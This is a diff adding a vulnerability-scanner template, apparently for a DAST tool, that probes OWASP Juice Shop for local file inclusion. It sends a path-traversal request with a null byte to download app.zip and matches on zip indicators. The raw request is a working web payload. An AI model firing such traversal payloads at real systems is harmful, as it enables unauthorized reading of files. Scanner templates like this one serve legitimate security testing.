@@ -1,0 +1,28 @@
+id: juice-shop-lfi-null-byte
+info:
+  name: Juice Shop LFI via Null Byte
+  author: dast-mvp
+  description: Local File Inclusion via null byte injection in file download
+  severity: high
+  tags:
+    - lfi
+    - juice-shop
+    - owasp
+
+http:
+  - raw:
+      - |
+        GET /api/Products/1/image?download=../../../app.zip%00.jpg HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 403
+      - type: word
+        words:
+          - "application/zip"
+          - "PK"
+        part: header
+        condition: or
